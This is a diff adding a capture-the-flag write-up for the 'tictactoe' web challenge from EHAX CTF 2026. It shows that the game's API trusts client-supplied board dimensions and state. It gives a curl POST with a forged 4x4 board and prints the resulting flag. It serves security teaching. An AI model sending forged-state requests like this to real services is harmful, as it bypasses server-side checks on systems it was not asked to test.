@@ -1,0 +1,65 @@
+---
+title: 'EHAX CTF 2026 - tictactoe (Web)'
+description: 'Writeup for tictactoe from EHAX CTF 2026. A web challenge that involves exploiting server-side trust by bypassing dimension checks in a classic 3x3 game API.'
+date: 2026-03-02
+tags: ['writeup', 'web', 'ehax']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Web
+**Target:** `https://ctf-challenge-1-beige.vercel.app/`
+
+**TL;DR:** The frontend application sends the game state directly to a backend API at `/api`. Code inspection reveals a hidden branch for a `"4x4"` game mode. The server fully trusts client-provided input for both the mode and the game state without validating the legitimacy of the move progression. Supplying a forged `4x4` game state full of `1`s bypasses standard checks and tricks the backend into yielding the flag.
+
+## 1. Recon
+
+1. Opening the challenge page presents a standard Tic-Tac-Toe interface.
+2. Inspecting the client-side source code (`script.js`) reveals that the game state is sent as a JSON POST request to `/api` with user-controlled fields:
+   - `mode` (e.g., `"3x3"`)
+   - `state` (The matrix of the current game board)
+3. Testing the `/api` manually using `curl` confirms we can send arbitrary game states.
+4. Forging a winning horizontal line in a standard `"3x3"` matrix returns a cheat message:
+   - *"flag only releases for a valid dimensional shift."*
+5. The term "dimensional shift" hints that setting the `mode` parameter to `"4x4"` might reach a different, undocumented logic path.
+
+## 2. Exploitation Strategy
+
+The server side relies on client-provided game state variables to track victories, and fails to actually validate if the progression of the game states was a valid sequence of actual moves.
+
+By manipulating the POST request payload, we can declare the mode to be `4x4` and supply a pre-won state matrix consisting entirely of `1`s (representing our pieces).
+
+## 3. Exploit Execution
+
+Send a `POST` request with the following JSON body:
+- `mode = "4x4"`
+- `state = 4x4` matrix of `1`s
+
+```bash
+curl -sS https://ctf-challenge-1-beige.vercel.app/api \
+  -H 'Content-Type: application/json' \
+  --data '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}'
+```
+
+**Observation:**
+
+The backend accepts the forged dimensional matrix and immediately evaluates it as a victory condition, responding with:
+
+```json
+{
+  "message": "AI: Protocol bypassed... You didn't just play the game; you rewrote the rules. Respect.",
+  "flag": "EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}"
+}
+```
+
+## 4. Root Cause Summary
+
+Server-side trust of client-provided input. The API unconditionally accepted the supplied game mode and state matrix without applying strict server-side bounds checking or validation of legitimate move progression logic.
+
+## 5. Flag
+
+```text
+EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}
+```
